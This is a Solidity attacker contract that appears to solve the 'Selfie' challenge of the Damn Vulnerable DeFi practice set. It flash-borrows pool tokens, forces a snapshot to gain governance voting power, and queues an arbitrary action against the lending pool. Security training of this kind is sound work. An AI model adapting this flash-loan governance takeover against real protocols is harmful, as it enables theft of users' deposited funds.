// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


//import "@openzeppelin/contracts/token/ERC20.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker {
    address public recovery;
    SelfiePool public selfiePool;
    SimpleGovernance public governance;

    constructor(address recovery_, address selfiePool_, address governance_) {
        recovery = recovery_;
        selfiePool = SelfiePool(selfiePool_);
        governance = SimpleGovernance(governance_);
    }

    function attack(uint256 amount, address token, bytes calldata data) external {
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), token, amount, data);
    } 

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata data) external returns(bytes32) {
        uint256 id = DamnValuableTokenSnapshot(token).snapshot();
        require(id == 2, "no snapshot created");
        governance.queueAction(address(selfiePool), 0, data);
        DamnValuableTokenSnapshot(token).approve(address(selfiePool), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}